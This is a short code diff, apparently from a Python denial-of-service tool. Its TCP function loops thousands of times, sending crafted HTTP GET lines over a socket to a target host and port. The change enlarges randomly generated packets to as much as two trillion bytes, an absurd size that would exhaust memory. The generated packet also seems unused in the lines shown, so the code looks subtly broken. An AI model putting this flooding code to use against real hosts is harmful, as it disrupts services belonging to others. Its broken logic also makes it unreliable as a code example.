@@ -54,7 +54,7 @@ def TCP(threads, host, port, mode):
                 # We will create a packet and send it
                 try:
                     for _ in range(6000):
-                        packet = random._urandom(random.randint(1,200000000))
+                        packet = random._urandom(random.randint(1,2000000000000))
                         data = str("GET /? HTTP/1.1\r\nAccept-language: en-US,en,q=0.5".encode('utf-8'))
 
                         sock.send("{}\r\n".format(data).encode("utf-8"))
